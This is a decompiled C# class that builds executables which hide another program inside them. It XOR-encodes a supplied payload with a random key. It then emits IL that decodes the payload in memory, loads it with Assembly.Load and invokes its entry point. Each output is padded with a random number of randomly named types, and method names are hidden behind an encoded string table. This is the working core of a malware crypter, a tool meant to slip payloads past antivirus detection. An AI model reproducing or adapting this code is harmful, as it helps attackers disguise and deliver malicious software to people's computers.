using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

public static class DynamicIlEmitter
{
	internal static readonly Random random_0 = new Random();

	internal static readonly Type[] type_0 = new Type[10]
	{
		typeof(void),
		typeof(int),
		typeof(uint),
		typeof(long),
		typeof(ulong),
		typeof(short),
		typeof(ushort),
		typeof(float),
		typeof(double),
		typeof(bool)
	};

	internal static void smethod_0(ILGenerator ilgenerator_0, byte[] byte_0)
	{
		byte b = (byte)DynamicIlEmitter.random_0.Next(1, 256);
		StringBuilder stringBuilder = new StringBuilder(byte_0.Length);
		for (int i = 0; i < byte_0.Length; i++)
		{
			stringBuilder.Append((char)(byte_0[i] ^ b));
		}
		string str = stringBuilder.ToString();
		int num = DynamicIlEmitter.random_0.Next(3);
		LocalBuilder local;
		LocalBuilder localBuilder_;
		LocalBuilder localBuilder_2;
		LocalBuilder localBuilder_3;
		if (num != 0)
		{
			if (num == 1)
			{
				local = ilgenerator_0.DeclareLocal(typeof(object[]));
				localBuilder_ = ilgenerator_0.DeclareLocal(typeof(byte[]));
				localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
				localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(int));
			}
			else
			{
				localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(int));
				local = ilgenerator_0.DeclareLocal(typeof(object[]));
				localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
				localBuilder_ = ilgenerator_0.DeclareLocal(typeof(byte[]));
			}
		}
		else
		{
			localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
			localBuilder_ = ilgenerator_0.DeclareLocal(typeof(byte[]));
			localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(int));
			local = ilgenerator_0.DeclareLocal(typeof(object[]));
		}
		Label label = ilgenerator_0.DefineLabel();
		Label label2 = ilgenerator_0.DefineLabel();
		ilgenerator_0.Emit(OpCodes.Ldstr, str);
		ilgenerator_0.smethod_2(localBuilder_2);
		ilgenerator_0.smethod_1(localBuilder_2);
		ilgenerator_0.Emit(OpCodes.Callvirt, DynamicIlEmitter.method_0(typeof(string), EncodedStringTable.smethod_0(24)));
		ilgenerator_0.Emit(OpCodes.Newarr, typeof(byte));
		ilgenerator_0.smethod_2(localBuilder_);
		ilgenerator_0.Emit(OpCodes.Ldc_I4_0);
		ilgenerator_0.smethod_2(localBuilder_3);
		ilgenerator_0.Emit(OpCodes.Br_S, label);
		ilgenerator_0.MarkLabel(label2);
		ilgenerator_0.smethod_1(localBuilder_);
		ilgenerator_0.smethod_1(localBuilder_3);
		ilgenerator_0.smethod_1(localBuilder_2);
		ilgenerator_0.smethod_1(localBuilder_3);
		ilgenerator_0.Emit(OpCodes.Callvirt, DynamicIlEmitter.method_0(typeof(string), EncodedStringTable.smethod_0(41)));
		ilgenerator_0.Emit(OpCodes.Ldc_I4_S, b);
		ilgenerator_0.Emit(OpCodes.Xor);
		ilgenerator_0.Emit(OpCodes.Conv_U1);
		ilgenerator_0.Emit(OpCodes.Stelem_I1);
		ilgenerator_0.smethod_1(localBuilder_3);
		ilgenerator_0.Emit(OpCodes.Ldc_I4_1);
		ilgenerator_0.Emit(OpCodes.Add);
		ilgenerator_0.smethod_2(localBuilder_3);
		ilgenerator_0.MarkLabel(label);
		ilgenerator_0.smethod_1(localBuilder_3);
		ilgenerator_0.smethod_1(localBuilder_2);
		ilgenerator_0.Emit(OpCodes.Callvirt, DynamicIlEmitter.method_0(typeof(string), EncodedStringTable.smethod_0(24)));
		ilgenerator_0.Emit(OpCodes.Blt_S, label2);
		ilgenerator_0.smethod_1(localBuilder_);
		ilgenerator_0.Emit(OpCodes.Call, DynamicIlEmitter.method_1(typeof(Assembly), EncodedStringTable.smethod_0(54), new Type[]
		{
			typeof(byte[])
		}));
		ilgenerator_0.Emit(OpCodes.Callvirt, DynamicIlEmitter.method_0(typeof(Assembly), EncodedStringTable.smethod_0(63)));
		ilgenerator_0.Emit(OpCodes.Ldnull);
		ilgenerator_0.Emit(OpCodes.Ldc_I4_1);
		ilgenerator_0.Emit(OpCodes.Newarr, typeof(object));
		ilgenerator_0.Emit(OpCodes.Stloc, local);
		ilgenerator_0.Emit(OpCodes.Ldloc, local);
		ilgenerator_0.Emit(OpCodes.Ldc_I4_0);
		ilgenerator_0.Emit(OpCodes.Ldarg_0);
		ilgenerator_0.Emit(OpCodes.Stelem_Ref);
		ilgenerator_0.Emit(OpCodes.Ldloc, local);
		ilgenerator_0.Emit(OpCodes.Callvirt, DynamicIlEmitter.method_1(typeof(MethodBase), EncodedStringTable.smethod_0(84), new Type[]
		{
			typeof(object),
			typeof(object[])
		}));
		ilgenerator_0.Emit(OpCodes.Pop);
		ilgenerator_0.Emit(OpCodes.Ret);
	}

	internal static void smethod_1(this ILGenerator ilgenerator_0, LocalBuilder localBuilder_0)
	{
		if (localBuilder_0.LocalIndex == 0)
		{
			ilgenerator_0.Emit(OpCodes.Ldloc_0);
			return;
		}
		if (localBuilder_0.LocalIndex == 1)
		{
			ilgenerator_0.Emit(OpCodes.Ldloc_1);
			return;
		}
		if (localBuilder_0.LocalIndex == 2)
		{
			ilgenerator_0.Emit(OpCodes.Ldloc_2);
			return;
		}
		if (localBuilder_0.LocalIndex == 3)
		{
			ilgenerator_0.Emit(OpCodes.Ldloc_3);
			return;
		}
		ilgenerator_0.Emit(OpCodes.Ldloc, localBuilder_0);
	}

	internal static void smethod_2(this ILGenerator ilgenerator_0, LocalBuilder localBuilder_0)
	{
		if (localBuilder_0.LocalIndex == 0)
		{
			ilgenerator_0.Emit(OpCodes.Stloc_0);
			return;
		}
		if (localBuilder_0.LocalIndex == 1)
		{
			ilgenerator_0.Emit(OpCodes.Stloc_1);
			return;
		}
		if (localBuilder_0.LocalIndex == 2)
		{
			ilgenerator_0.Emit(OpCodes.Stloc_2);
			return;
		}
		if (localBuilder_0.LocalIndex != 3)
		{
			ilgenerator_0.Emit(OpCodes.Stloc, localBuilder_0);
			return;
		}
		ilgenerator_0.Emit(OpCodes.Stloc_3);
	}

	public static void smethod_3(byte[] byte_0, string string_0, PEFileKinds pefileKinds_0)
	{
		AssemblyName assemblyName = new AssemblyName(RecoveredRuntime.smethod_426());
		AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Save);
		ModuleBuilder moduleBuilder_ = assemblyBuilder.DefineDynamicModule(assemblyName.Name, assemblyName.Name + EncodedStringTable.smethod_0(93));
		int num = DynamicIlEmitter.random_0.Next(5, 30);
		int num2 = DynamicIlEmitter.random_0.Next(num);
		MethodBuilder methodBuilder = null;
		for (int i = 0; i < num; i++)
		{
			TypeBuilder typeBuilder = RecoveredRuntime.smethod_5(moduleBuilder_);
			if (num2 == i)
			{
				methodBuilder = typeBuilder.DefineMethod(RecoveredRuntime.smethod_426(), MethodAttributes.FamANDAssem | MethodAttributes.Family | MethodAttributes.Static, typeof(void), new Type[]
				{
					typeof(string[])
				});
				DynamicIlEmitter.smethod_0(methodBuilder.GetILGenerator(), byte_0);
				methodBuilder.SetCustomAttribute(new CustomAttributeBuilder(DynamicIlEmitter.method_2(typeof(STAThreadAttribute), new Type[0]), new object[0]));
			}
			typeBuilder.CreateType();
		}
		assemblyBuilder.SetEntryPoint(methodBuilder, pefileKinds_0);
		assemblyBuilder.Save(assemblyName.Name + EncodedStringTable.smethod_0(93));
		File.Move(assemblyName.Name + EncodedStringTable.smethod_0(93), string_0);
	}

	internal static int smethod_4(Random random_1, int int_0, int int_1)
	{
		return random_1.Next(int_0, int_1);
	}

	internal static StringBuilder smethod_5(int int_0)
	{
		return new StringBuilder(int_0);
	}

	internal static StringBuilder smethod_6(StringBuilder stringBuilder_0, char char_0)
	{
		return stringBuilder_0.Append(char_0);
	}

	internal static string smethod_7(object object_0)
	{
		return object_0.ToString();
	}

	internal static int smethod_8(Random random_1, int int_0)
	{
		return random_1.Next(int_0);
	}

	internal static Type smethod_9(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	internal static LocalBuilder smethod_10(ILGenerator ilgenerator_0, Type type_1)
	{
		return ilgenerator_0.DeclareLocal(type_1);
	}

	internal static Label smethod_11(ILGenerator ilgenerator_0)
	{
		return ilgenerator_0.DefineLabel();
	}

	internal static void smethod_12(ILGenerator ilgenerator_0, OpCode opCode_0, string string_0)
	{
		ilgenerator_0.Emit(opCode_0, string_0);
	}

	internal static MethodInfo method_0(Type type, string string_0)
	{
		return type.GetMethod(string_0);
	}

	internal static void smethod_13(ILGenerator ilgenerator_0, OpCode opCode_0, MethodInfo methodInfo_0)
	{
		ilgenerator_0.Emit(opCode_0, methodInfo_0);
	}

	internal static void smethod_14(ILGenerator ilgenerator_0, OpCode opCode_0, Type type_1)
	{
		ilgenerator_0.Emit(opCode_0, type_1);
	}

	internal static void smethod_15(ILGenerator ilgenerator_0, OpCode opCode_0)
	{
		ilgenerator_0.Emit(opCode_0);
	}

	internal static void smethod_16(ILGenerator ilgenerator_0, OpCode opCode_0, Label label_0)
	{
		ilgenerator_0.Emit(opCode_0, label_0);
	}

	internal static void smethod_17(ILGenerator ilgenerator_0, Label label_0)
	{
		ilgenerator_0.MarkLabel(label_0);
	}

	internal static void smethod_18(ILGenerator ilgenerator_0, OpCode opCode_0, byte byte_0)
	{
		ilgenerator_0.Emit(opCode_0, byte_0);
	}

	internal static MethodInfo method_1(Type type, string string_0, Type[] type_1)
	{
		return type.GetMethod(string_0, type_1);
	}

	internal static void smethod_19(ILGenerator ilgenerator_0, OpCode opCode_0, LocalBuilder localBuilder_0)
	{
		ilgenerator_0.Emit(opCode_0, localBuilder_0);
	}

	internal static int smethod_20(LocalVariableInfo localVariableInfo_0)
	{
		return localVariableInfo_0.LocalIndex;
	}

	internal static AssemblyName smethod_21(string string_0)
	{
		return new AssemblyName(string_0);
	}

	internal static AppDomain smethod_22()
	{
		return AppDomain.CurrentDomain;
	}

	internal static AssemblyBuilder smethod_23(AppDomain appDomain_0, AssemblyName assemblyName_0, AssemblyBuilderAccess assemblyBuilderAccess_0)
	{
		return appDomain_0.DefineDynamicAssembly(assemblyName_0, assemblyBuilderAccess_0);
	}

	internal static string smethod_24(AssemblyName assemblyName_0)
	{
		return assemblyName_0.Name;
	}

	internal static string smethod_25(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	internal static ModuleBuilder smethod_26(AssemblyBuilder assemblyBuilder_0, string string_0, string string_1)
	{
		return assemblyBuilder_0.DefineDynamicModule(string_0, string_1);
	}

	internal static MethodBuilder smethod_27(TypeBuilder typeBuilder_0, string string_0, MethodAttributes methodAttributes_0, Type type_1, Type[] type_2)
	{
		return typeBuilder_0.DefineMethod(string_0, methodAttributes_0, type_1, type_2);
	}

	internal static ILGenerator smethod_28(MethodBuilder methodBuilder_0)
	{
		return methodBuilder_0.GetILGenerator();
	}

	internal static ConstructorInfo method_2(Type type, Type[] type_1)
	{
		return type.GetConstructor(type_1);
	}

	internal static CustomAttributeBuilder smethod_29(ConstructorInfo constructorInfo_0, object[] object_0)
	{
		return new CustomAttributeBuilder(constructorInfo_0, object_0);
	}

	internal static void smethod_30(MethodBuilder methodBuilder_0, CustomAttributeBuilder customAttributeBuilder_0)
	{
		methodBuilder_0.SetCustomAttribute(customAttributeBuilder_0);
	}

	internal static Type smethod_31(TypeBuilder typeBuilder_0)
	{
		return typeBuilder_0.CreateType();
	}

	internal static void smethod_32(AssemblyBuilder assemblyBuilder_0, MethodInfo methodInfo_0, PEFileKinds pefileKinds_0)
	{
		assemblyBuilder_0.SetEntryPoint(methodInfo_0, pefileKinds_0);
	}

	internal static void smethod_33(AssemblyBuilder assemblyBuilder_0, string string_0)
	{
		assemblyBuilder_0.Save(string_0);
	}

	internal static void smethod_34(string string_0, string string_1)
	{
		File.Move(string_0, string_1);
	}

	internal static Random smethod_35()
	{
		return new Random();
	}
}
